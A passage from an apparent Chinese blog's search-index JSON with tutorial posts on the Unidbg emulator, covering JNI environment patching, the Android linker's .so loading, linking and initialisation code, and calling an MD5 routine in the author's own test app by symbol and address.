com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262) at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodV(DvmMethod.java:89) at com.github.unidbg.linux.android.dvm.DalvikVM$32.handle(DalvikVM.java:553) 按惯例,补代码如下: public DvmObject\u003c?\u003e callObjectMethodV(BaseVM vm, DvmObject\u003c?\u003e dvmObject, String signature, VaList vaList) { switch (signature) { case \"android/app/ActivityThread-\u003egetApplication()Landroid/app/Application;\":{ return vm.resolveClass(\"android/app/Application\").newObject(null); } } return super.callObjectMethodV(vm, dvmObject, signature, vaList); } 继续运行代码,报错如下: java.lang.UnsupportedOperationException: android/view/accessibility/AccessibilityManager-\u003egetInstalledAccessibilityServiceList()Ljava/util/List; at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417) at com.example.luodst.MainActivity.callObjectMethodV(MainActivity.java:64) at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262) at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodV(DvmMethod.java:89) 通过下述网址,查询getInstalledAccessibilityServiceList方法是返回已安装辅助功能服务的AccessibilityServiceInfos https://developer.android.com/reference 这里先不用管值的正确性,补代码如下: public DvmObject\u003c?\u003e callObjectMethodV(BaseVM vm, DvmObject\u003c?\u003e dvmObject, String signature, VaList vaList) { switch (signature) { case \"android/view/accessibility/AccessibilityManager-\u003egetInstalledAccessibilityServiceList()Ljava/util/List;\":{ List\u003cDvmObject\u003c?\u003e\u003e list = new ArrayList\u003c\u003e(); DvmClass dvmClass = vm.resolveClass(\"android/accessibilityservice/AccessibilityServiceInfo\"); list.add(dvmClass.newObject(null)); list.add(dvmClass.newObject(null)); list.add(dvmClass.newObject(null)); return new ArrayListObject(vm, list); } } return super.callObjectMethodV(vm, dvmObject, signature, vaList); } 继续运行代码,报错如下: java.lang.UnsupportedOperationException: android/accessibilityservice/AccessibilityServiceInfo-\u003egetResolveInfo()Landroid/co","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:5:2","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"补环境通用规则 基本类型,如Byte、Short、Int、Long、Double、Float、Boolean、Char等类型,直接传递即可. case \"android/content/pm/PackageManager-\u003eGET_SIGNATURES:I\":{ return 0x40; } 注意 在准备参数,发起函数调用时,Long类型的参数必须显示声明,即在整数后面加L,不能使用隐式声明. 基本类型的包装类、字符串、基本类型数组、对象数组等直接传递,对象内部会做封装,也可以自己调用new StringPbject(vm, st)、new ByteArray(vm, value)等. case \"android/app/ActivityThread-\u003ecurrentPackageName()Ljava/lang/String;\":{ //return ProxyDvmObject.createObject(vm, vm.getPackageName()); return new StringObject(vm, vm.getPackageName()); } ProxyDvmObject.createObject内部做了类型判断,会根据不同的类型进行转换. //ProxyDvmObject.java public static DvmObject\u003c?\u003e createObject(VM vm, Object value) { if (value == null) { return null; } if (value instanceof Class\u003c?\u003e) { return getObjectType(vm, (Class\u003c?\u003e) value); } if (value instanceof DvmObject) { return (DvmObject\u003c?\u003e) value; } if (value instanceof byte[]) { return new ByteArray(vm, (byte[]) value); } if (value instanceof short[]) { return new ShortArray(vm, (short[]) value); } if (value instanceof int[]) { return new IntArray(vm, (int[]) value); } if (value instanceof float[]) { return new FloatArray(vm, (float[]) value); } if (value instanceof double[]) { return new DoubleArray(vm, (double[]) value); } if (value instanceof String) { return new StringObject(vm, (String) value); } Class\u003c?\u003e clazz = value.getClass(); if (clazz.isArray()) { if (clazz.getComponentType().isPrimitive()) { throw new UnsupportedOperationException(String.valueOf(value)); } Object[] array = (Object[]) value; DvmObject\u003c?\u003e[] dvmArray = new DvmObject[array.length]; for (int i = 0; i \u003c array.length; i++) { dvmArray[i] = createObject(vm, array[i]); } return new ArrayObject(dvmArray); } return new ProxyDvmObject(vm, value); } JDK标准库对象,如HashMap、JSONObject等,使用ProxyDvmObject.createObject(vm, value)处理. case \"java/util/HashMap-\u003e\u003cinit\u003e()V\":{ return ProxyDvmObject.createObject(vm, new HashMap\u003c\u003e()); } 非JDK标准库对象,如Android Context、SharedPreference等,使用vm.resolveClass(vm, className).newObject(value)处理. case \"android/app/ActivityThread-\u003egetApplication()Landroid/app/Application;\":{ return vm.resolveClass(\"android/app/Application\").newObject(null); } ","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:6:0","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"参考链接 \u003cUnidbg逆向工程 原理与实践\u003e ","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:7:0","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"初探Linker 当我们使用Android Studio进行NDK开发时,先在Java类中编写native方法的声明,之后在cpp文件中编写相应函数的实现,最后根据CMakeLists.txt将cpp代码编译为so,并在Java类中使用System.loadLibrary方法将Apk安装包中lib目录下相应架构的so文件载入内存.那该方法如何将so文件载入内存? 这需要我们深入源码来探究它内部的代码逻辑. ","date":"2024-06-29","objectID":"/posts/android/unidbg/03android-so%E5%8A%A0%E8%BD%BD%E9%93%BE%E6%8E%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B/:1:0","tags":["Unidbg"],"title":"Android so-加载、链接、初始化流程","uri":"/posts/android/unidbg/03android-so%E5%8A%A0%E8%BD%BD%E9%93%BE%E6%8E%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B/"},{"categories":["Unidbg"],"content":"Java层代码跟踪 Java层加载so文件的入口为System.loadLibrary方法,我们以此为入口进行源码跟踪. //http://androidxref.com/4.4.4_r1/xref/libcore/luni/src/main/java/java/lang/System.java public static void loadLibrary(String libName) //http://androidxref.com/4.4.4_r1/xref/libcore/luni/src/main/java/java/lang/Runtime.java void loadLibrary(String libraryName, ClassLoader loader) -\u003eprivate String doLoad(String name, ClassLoader loader) -\u003eprivate static native String nativeLoad(String filename, ClassLoader loader, String ldLibraryPath) ","date":"2024-06-29","objectID":"/posts/android/unidbg/03android-so%E5%8A%A0%E8%BD%BD%E9%93%BE%E6%8E%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B/:1:1","tags":["Unidbg"],"title":"Android so-加载、链接、初始化流程","uri":"/posts/android/unidbg/03android-so%E5%8A%A0%E8%BD%BD%E9%93%BE%E6%8E%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B/"},{"categories":["Unidbg"],"content":"Native层代码跟踪 nativeLoad为Native层方法,继续搜索nativeLoad定义,发现在java_lang_Runtime.cc文件中. //http://androidxref.com/4.4.4_r1/xref/art/runtime/native/java_lang_Runtime.cc NATIVE_METHOD(Runtime, nativeLoad, \"(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;)Ljava/lang/String;\") -\u003estatic jstring Runtime_nativeLoad(JNIEnv* env, jclass, jstring javaFilename, jobject javaLoader, jstring javaLdLibraryPath) //http://androidxref.com/4.4.4_r1/xref/art/runtime/jni_internal.cc bool JavaVMExt::LoadNativeLibrary(const std::string\u0026 path, ClassLoader* class_loader, std::string\u0026 detail) //http://androidxref.com/4.4.4_r1/xref/bionic/linker/dlfcn.cpp void* dlopen(const char* filename, int flags) //http://androidxref.com/4.4.4_r1/xref/bionic/linker/linker.cpp soinfo* do_dlopen(const char* name, int flags) do_dlopen()函数位于linker.cpp中,从此处开始便进入了Linker的代码细节. ","date":"2024-06-29","objectID":"/posts/android/unidbg/03android-so%E5%8A%A0%E8%BD%BD%E9%93%BE%E6%8E%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B/:1:2","tags":["Unidbg"],"title":"Android so-加载、链接、初始化流程","uri":"/posts/android/unidbg/03android-so%E5%8A%A0%E8%BD%BD%E9%93%BE%E6%8E%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B/"},{"categories":["Unidbg"],"content":"深入Linker ","date":"2024-06-29","objectID":"/posts/android/unidbg/03android-so%E5%8A%A0%E8%BD%BD%E9%93%BE%E6%8E%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B/:2:0","tags":["Unidbg"],"title":"Android so-加载、链接、初始化流程","uri":"/posts/android/unidbg/03android-so%E5%8A%A0%E8%BD%BD%E9%93%BE%E6%8E%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B/"},{"categories":["Unidbg"],"content":"so加载 do_dlopen函数定义如下: //http://androidxref.com/4.4.4_r1/xref/bionic/linker/linker.cpp soinfo *do_dlopen(const char *name, int flags) { if ((flags \u0026 ~(RTLD_NOW | RTLD_LAZY | RTLD_LOCAL | RTLD_GLOBAL)) != 0) { DL_ERR(\"invalid flags to dlopen: %x\", flags); return NULL; } set_soinfo_pool_protection(PROT_READ | PROT_WRITE); soinfo *si = find_library(name); if (si != NULL) { si-\u003eCallConstructors(); } set_soinfo_pool_protection(PROT_READ); return si; } 该函数通过find_library函数加载so,如果成功加载,调用si-\u003ecall_constructors函数进行so的初始化操作,然后返回soinfo类型的指针. 跟踪find_library函数如下: //http://androidxref.com/4.4.4_r1/xref/bionic/linker/linker.cpp static soinfo* find_library(const char* name) -\u003estatic soinfo *find_library_internal(const char *name) { if (name == NULL) { return somain; } soinfo *si = find_loaded_library(name); if (si != NULL) { if (si-\u003eflags \u0026 FLAG_LINKED) { return si; } DL_ERR(\"OOPS: recursive link to \\\"%s\\\"\", si-\u003ename); return NULL; } TRACE(\"[ '%s' has not been loaded yet. Locating...]\", name); si = load_library(name); if (si == NULL) { return NULL; } // At this point we know that whatever is loaded @ base is a valid ELF // shared library whose segments are properly mapped in. TRACE(\"[ init_library base=0x%08x sz=0x%08x name='%s' ]\", si-\u003ebase, si-\u003esize, si-\u003ename); if (!soinfo_link_image(si)) { munmap(reinterpret_cast\u003cvoid *\u003e(si-\u003ebase), si-\u003esize); soinfo_free(si); return NULL; } return si; } find_library函数调用load_library函数进行so的加载,然后通过soinfo_link_image函数完成so的链接过程. 跟踪load_library函数如下: //http://androidxref.com/4.4.4_r1/xref/bionic/linker/linker.cpp static soinfo *load_library(const char *name) { // Open the file. int fd = open_library(name); if (fd == -1) { DL_ERR(\"library \\\"%s\\\" not found\", name); return NULL; } // Read the ELF header and load the segments. ElfReader elf_reader(name, fd); if (!elf_reader.Load()) { return NULL; } const char *bname = strrchr(name, '/'); soinfo *si = soinfo_alloc(bname ? bname + 1 : name); if (si == NULL) { return NULL; } si-\u003ebase = elf_reader.load_start(); si-\u003esize = elf_reader.load_size(); si-\u003eload_bias = elf_reader.load_bias(); si-\u003eflags = 0; si-\u003eentry = 0; si-\u003edynamic = NULL; si-\u003ephnum = elf_reader.phdr_count(); si-\u003ephdr = elf_reader.loaded_phdr(); return si; } 该函数先通过open_library打开so文件,拿到一个文件描述符,然后创建ElfReader对象,通过elf_reader.Load函数进行结构填充,最后将elf_reader读取到的结构赋值给si当做结果返回. 跟踪elf_reader.Load函数如下: //http://androidxref.com/4.4.4_r1/xref/bionic/linker/linker_phdr.cpp bool ElfReader::Load() { return ReadElfHeader() \u0026\u0026 VerifyElfHeader() \u0026\u0026 ReadProgramHeader() \u0026\u0026 ReserveAddressSpace() \u0026\u0026 LoadSegments() \u0026\u0026 FindPhdr(); } 接下来分别跟踪上述函数进行分析so加载流程. 跟踪ReadElfHeader函数如下: //http://androidxref.com/4.4.4_r1/xref/bionic/linker/linker_phdr.cpp Elf32_Ehdr header_; bool ElfReader::ReadElfHeader() { ssize_t rc = TEMP_FAILURE_RETRY(read(fd_, \u0026header_, sizeof(header_))); if (rc \u003c 0) { DL_ERR(\"can't read file \\\"%s\\\": %s\", name_, strerror(errno)); return false; } if (rc != sizeof(header_)) { DL_ERR(\"\\\"%s\\\" is too small to be an ELF executable\", name_); return false; } return true; } 该函数主要从文件中读取header_结构体大小的字节数据到header_中,而header_的类型为Elf32_Ehdr 跟踪VerifyElfHeader函数如下: //http://androidxref.com/4.4.4_r1/xref/bionic/linker/linker_phdr.cpp bool ElfReader::VerifyElfHeader() { //判断ELF魔术头 if (header_.e_ident[EI_MAG0] != ELFMAG0 || header_.e_ident[EI_MAG1] != ELFMAG1 || header_.e_ident[EI_MAG2] != ELFMAG2 || header_.e_ident[EI_MAG3] != ELFMAG3) { DL_ERR(\"\\\"%s\\\" has bad ELF magic\", name_); return false; } //判断是否为32位so if (header_.e_ident[EI_CLASS] != ELFCLASS32) { DL_ERR(\"\\\"%s\\\" not 32-bit: %d\", name_, header_.e_ident[EI_CLASS]); return false; } //判断是否为小端序 if (header_.e_ident[EI_DATA] != ELFDATA2LSB) { DL_ERR(\"\\\"%s\\\" not little-endian: %d\", name_, header_.e_ident[EI_DATA]); return false; } //判断文件类型是否为共享目标文件 if (header_.e_type != ET_DYN) { DL_ERR(\"\\\"%s\\\" has unexpected e_type: %d\", name_, header_.e_type); return false; } //判断ELF版本 if (header_.e_version != EV_CURRENT) { DL_ERR(\"\\\"%s\\\" has unexpected e_version: %d\", name_, header_.e_version); return false; } //检查","date":"2024-06-29","objectID":"/posts/android/unidbg/03android-so%E5%8A%A0%E8%BD%BD%E9%93%BE%E6%8E%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B/:2:1","tags":["Unidbg"],"title":"Android so-加载、链接、初始化流程","uri":"/posts/android/unidbg/03android-so%E5%8A%A0%E8%BD%BD%E9%93%BE%E6%8E%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B/"},{"categories":["Unidbg"],"content":"so链接 跟踪soinfo_link_image函数如下: //http://androidxref.com/4.4.4_r1/xref/bionic/linker/linker.cpp static bool soinfo_link_image(soinfo *si) { /* \"base\" might wrap around UINT32_MAX. */ Elf32_Addr base = si-\u003eload_bias; const Elf32_Phdr *phdr = si-\u003ephdr; int phnum = si-\u003ephnum; bool relocating_linker = (si-\u003eflags \u0026 FLAG_LINKER) != 0; //---------------------------------- /* Extract dynamic section */ size_t dynamic_count; Elf32_Word dynamic_flags; // ①查找PT_DYNAMIC段 phdr_table_get_dynamic_section(phdr, phnum, base, \u0026si-\u003edynamic, \u0026dynamic_count, \u0026dynamic_flags); if (si-\u003edynamic == NULL) { if (!relocating_linker) { DL_ERR(\"missing PT_DYNAMIC in \\\"%s\\\"\", si-\u003ename); } return false; } else { if (!relocating_linker) { DEBUG(\"dynamic = %p\", si-\u003edynamic); } } //---------------------------------- return true } 可以看到上述先获取了so加载到内存的地址以及程序头表的指针和数目,然后通过phdr_table_get_dynamic_section函数找到PT_DYNAMIC段的指针. phdr_table_get_dynamic_section函数如下: //http://androidxref.com/4.4.4_r1/xref/bionic/linker/linker_phdr.cpp void phdr_table_get_dynamic_section(const Elf32_Phdr *phdr_table, int phdr_count, Elf32_Addr load_bias, Elf32_Dyn **dynamic, size_t *dynamic_count, Elf32_Word *dynamic_flags) { const Elf32_Phdr *phdr = phdr_table; const Elf32_Phdr *phdr_limit = phdr + phdr_count; for (phdr = phdr_table; phdr \u003c phdr_limit; phdr++) { if (phdr-\u003ep_type != PT_DYNAMIC) { continue; } *dynamic = reinterpret_cast\u003cElf32_Dyn *\u003e(load_bias + phdr-\u003ep_vaddr); if (dynamic_count) { *dynamic_count = (unsigned)(phdr-\u003ep_memsz / 8); } if (dynamic_flags) { *dynamic_flags = phdr-\u003ep_flags; } return; } *dynamic = NULL; if (dynamic_count) { *dynamic_count = 0; } } 返回soinfo_link_image函数,继续分析. //http://androidxref.com/4.4.4_r1/xref/bionic/linker/linker.cpp static bool soinfo_link_image(soinfo *si) { //---------------------------------- // ②对PT_DYNAMIC段中的字段进行遍历,并根据d_tag做不通操作 uint32_t needed_count = 0; for (Elf32_Dyn *d = si-\u003edynamic; d-\u003ed_tag != DT_NULL; ++d) { DEBUG(\"d = %p, d[0](tag) = 0x%08x d[1](val) = 0x%08x\", d, d-\u003ed_tag, d-\u003ed_un.d_val); switch (d-\u003ed_tag) { case DT_HASH: // 哈希表 si-\u003enbucket = ((unsigned *)(base + d-\u003ed_un.d_ptr))[0]; si-\u003enchain = ((unsigned *)(base + d-\u003ed_un.d_ptr))[1]; si-\u003ebucket = (unsigned *)(base + d-\u003ed_un.d_ptr + 8); si-\u003echain = (unsigned *)(base + d-\u003ed_un.d_ptr + 8 + si-\u003enbucket * 4); break; case DT_STRTAB: // 字符串表 si-\u003estrtab = (const char *)(base + d-\u003ed_un.d_ptr); break; case DT_SYMTAB: // 符号表 si-\u003esymtab = (Elf32_Sym *)(base + d-\u003ed_un.d_ptr); break; case DT_PLTREL: if (d-\u003ed_un.d_val != DT_REL) { DL_ERR(\"unsupported DT_RELA in \\\"%s\\\"\", si-\u003ename); return false; } break; case DT_JMPREL: // PTL重定位表 si-\u003eplt_rel = (Elf32_Rel *)(base + d-\u003ed_un.d_ptr); break; case DT_PLTRELSZ: // PTL重定位表大小 si-\u003eplt_rel_count = d-\u003ed_un.d_val / sizeof(Elf32_Rel); break; case DT_REL: // 重定位表 si-\u003erel = (Elf32_Rel *)(base + d-\u003ed_un.d_ptr); break; case DT_RELSZ: // 重定位表大小 si-\u003erel_count = d-\u003ed_un.d_val / sizeof(Elf32_Rel); break; case DT_PLTGOT: // GOT全局偏移表,与PLT延迟绑定相关 /* Save this in case we decide to do lazy binding. We don't yet. */ si-\u003eplt_got = (unsigned *)(base + d-\u003ed_un.d_ptr); break; case DT_DEBUG: // 调试相关 // Set the DT_DEBUG entry to the address of _r_debug for GDB // if the dynamic table is writable if ((dynamic_flags \u0026 PF_W) != 0) { d-\u003ed_un.d_val = (int)\u0026_r_debug; } break; case DT_RELA: DL_ERR(\"unsupported DT_RELA in \\\"%s\\\"\", si-\u003ename); return false; case DT_INIT: // 初始化函数 si-\u003einit_func = reinterpret_cast\u003clinker_function_t\u003e(base + d-\u003ed_un.d_ptr); DEBUG(\"%s constructors (DT_INIT) found at %p\", si-\u003ename, si-\u003einit_func); break; case DT_FINI: // 析构函数 si-\u003efini_func = reinterpret_cast\u003clinker_function_t\u003e(base + d-\u003ed_un.d_ptr); DEBUG(\"%s destructors (DT_FINI) found at %p\", si-\u003ename, si-\u003efini_func); break; case DT_INIT_ARRAY: // init.array 初始化函数列表 si-\u003einit_array = reinterpret_cast\u003clinker_function_t *\u003e(base + d-\u003ed_un.d_ptr); DEBUG(\"%s constructors (DT_INIT_ARRAY) found at %p\", si-\u003ename, si-\u003einit_array); break; case DT_INIT_ARRAYSZ: // init.array 大小 si-\u003einit_array_count = ((unsigned)d-\u003ed_un.d_val) / s","date":"2024-06-29","objectID":"/posts/android/unidbg/03android-so%E5%8A%A0%E8%BD%BD%E9%93%BE%E6%8E%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B/:2:2","tags":["Unidbg"],"title":"Android so-加载、链接、初始化流程","uri":"/posts/android/unidbg/03android-so%E5%8A%A0%E8%BD%BD%E9%93%BE%E6%8E%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B/"},{"categories":["Unidbg"],"content":"so初始化 跟踪si-\u003ecall_constructors函数如下: //http://androidxref.com/4.4.4_r1/xref/bionic/linker/linker.cpp void soinfo::CallConstructors() { // 如果已初始化,则不再进行初始化 if (constructors_called) { return; } constructors_called = true; if ((flags \u0026 FLAG_EXE) == 0 \u0026\u0026 preinit_array != NULL) { // The GNU dynamic linker silently ignores these, but we warn the developer. PRINT(\"\\\"%s\\\": ignoring %d-entry DT_PREINIT_ARRAY in shared library!\", name, preinit_array_count); } // 如果dynamic段不为空,先处理依赖库的初始化 if (dynamic != NULL) { for (Elf32_Dyn *d = dynamic; d-\u003ed_tag != DT_NULL; ++d) { if (d-\u003ed_tag == DT_NEEDED) { const char *library_name = strtab + d-\u003ed_un.d_val; TRACE(\"\\\"%s\\\": calling constructors in DT_NEEDED \\\"%s\\\"\", name, library_name); find_loaded_library(library_name)-\u003eCallConstructors(); } } } TRACE(\"\\\"%s\\\": calling constructors\", name); // 调用init_func CallFunction(\"DT_INIT\", init_func); // 调用init_array CallArray(\"DT_INIT_ARRAY\", init_array, init_array_count, false); } so的初始化主要就是调用CallFunction以及CallArray函数分别对_init函数以及init_array函数数组进行调用. ","date":"2024-06-29","objectID":"/posts/android/unidbg/03android-so%E5%8A%A0%E8%BD%BD%E9%93%BE%E6%8E%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B/:2:3","tags":["Unidbg"],"title":"Android so-加载、链接、初始化流程","uri":"/posts/android/unidbg/03android-so%E5%8A%A0%E8%BD%BD%E9%93%BE%E6%8E%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B/"},{"categories":["Unidbg"],"content":"参考链接 \u003cUnidbg逆向工程 原理与实践\u003e ","date":"2024-06-29","objectID":"/posts/android/unidbg/03android-so%E5%8A%A0%E8%BD%BD%E9%93%BE%E6%8E%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B/:3:0","tags":["Unidbg"],"title":"Android so-加载、链接、初始化流程","uri":"/posts/android/unidbg/03android-so%E5%8A%A0%E8%BD%BD%E9%93%BE%E6%8E%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B/"},{"categories":["Unidbg"],"content":"概述 Unidbg是一个基于Unicorn的逆向工具,可以黑盒调用Android和iOS中的so文件.这使逆向人员无须了解so内部算法原理,只需主动调用so中的函数,传入所需的参数,补全运行所需的环境,即可得到需要的结果. 对于Android逆向来说,Unidbg有以下几个特点: 模拟JNI调用的API,因而可以调用JNI_OnLoad函数 支持JavaVM和JNIEnv 支持模拟系统调用指令 支持ARM32和ARM64 支持基于Dobby的Inline Hook 支持基于xHook的GOT Hook Unicorn后端支持简单的控制台调试器、GDB Stub、指令跟踪和内存读写跟踪 支持Dynarmic 其官方地址如下: https://github.com/zhkl0228/unidbg ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:1:0","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"模拟执行初探 ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:2:0","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"测试Apk java层: package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.text.TextUtils; import android.view.View; import android.widget.Button; import android.widget.TextView; import com.example.luodst.databinding.ActivityMainBinding; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; public class MainActivity extends AppCompatActivity { // Used to load the 'luodst' library on application startup. static { System.loadLibrary(\"luodst\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); TextView tv = binding.sampleText; findViewById(R.id.btn_md5).setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { tv.setText(md5(\"XiaLuoHun\")); } }); } public native String md5(String data); } Native层: #include \u003cjni.h\u003e #include \u003cstring\u003e void md5(const uint8_t *initial_msg, size_t initial_len, uint8_t *digest); extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luodst_MainActivity_md5(JNIEnv *env, jobject thiz, jstring data) { char *msg = const_cast\u003cchar *\u003e(env-\u003eGetStringUTFChars(data, 0)); int len = strlen(msg); uint8_t result[16]; for (int i = 0; i \u003c 1000000; i++) { md5((uint8_t*)msg, len, result); } char res[32] = {0}; for (int i = 0; i \u003c 16; i++) sprintf(res+i*2, \"%2.2x\", result[i]); return env-\u003eNewStringUTF(res); } // Constants are the integer part of the sines of integers (in radians) * 2^32. const uint32_t k[64] = { 0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee , 0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501 , 0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be , 0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821 , 0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa , 0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8 , 0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed , 0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a , 0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c , 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70 , 0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05 , 0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665 , 0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039 , 0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1 , 0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1 , 0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391 }; // r specifies the per-round shift amounts const uint32_t r[] = {7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21}; // leftrotate function definition #define LEFTROTATE(x, c) (((x) \u003c\u003c (c)) | ((x) \u003e\u003e (32 - (c)))) void to_bytes(uint32_t val, uint8_t *bytes) { bytes[0] = (uint8_t) val; bytes[1] = (uint8_t) (val \u003e\u003e 8); bytes[2] = (uint8_t) (val \u003e\u003e 16); bytes[3] = (uint8_t) (val \u003e\u003e 24); } uint32_t to_int32(const uint8_t *bytes) { return (uint32_t) bytes[0] | ((uint32_t) bytes[1] \u003c\u003c 8) | ((uint32_t) bytes[2] \u003c\u003c 16) | ((uint32_t) bytes[3] \u003c\u003c 24); } void md5(const uint8_t *initial_msg, size_t initial_len, uint8_t *digest) { // These vars will contain the hash uint32_t h0, h1, h2, h3; // Message (to prepare) uint8_t *msg = NULL; size_t new_len, offset; uint32_t w[16]; uint32_t a, b, c, d, i, f, g, temp; // Initialize variables - simple count in nibbles: h0 = 0x67452301; h1 = 0xefcdab89; h2 = 0x98badcfe; h3 = 0x10325476; //Pre-processing: //append \"1\" bit to message //append \"0\" bits until message length in bits ≡ 448 (mod 512) //append length mod (2^64) to message for (new_len = initial_len + 1; new_len % (512/8) != 448/8; new_len++) ; msg = (uint8_t*)malloc(new_len + 8); memcpy(msg, initial_msg, initial_len); msg[initial_len] = 0x80; // append the \"1\" bit; most significant bit is \"first\" for (offset = initial_len + 1; offset \u003c new_len; offset++) msg[offset] = 0; // append \"0\" bi","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:2:1","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"符号调用 Unidbg支持两种调用so中函数的方式:符号调用和地址调用. 符号调用的示例代码如下: private String call_md5() { //执行JNI方法 DvmObject obj = ProxyDvmObject.createObject(vm,this); //DvmObject obj = vm.resolveClass(\"com.example.luodst.MainActivity\").newObject(null); DvmObject dvmObject = obj.callJniMethodObject(emulator, \"md5(Ljava/lang/String;)Ljava/lang/String;\", \"XiaLuoHun\"); String retval = (String) dvmObject.getValue(); return retval; } 若使用ProxyDvmObject创建调用so的代理对象obj,需保证在Unidbg中新建的测试类和so中的Native方法所在的类一致. md5方法的返回值为String类型,故应使用callJniMethodObject()方法来调用md5方法,同时使用DvmObject对象来接收该返回值.除了基本类型之外,其余的类型都要返回DvmObject对象. ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:2:2","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"地址调用 地址调用的示例代码如下: private String call_addr() { //构造函数参数 Pointer jniEnv = vm.getJNIEnv(); DvmObject obj = ProxyDvmObject.createObject(vm,this); StringObject data = new StringObject(vm, \"XiaLuoHun\"); //构造为参数列表 List\u003cObject\u003e args = new ArrayList\u003c\u003e(); args.add(jniEnv); 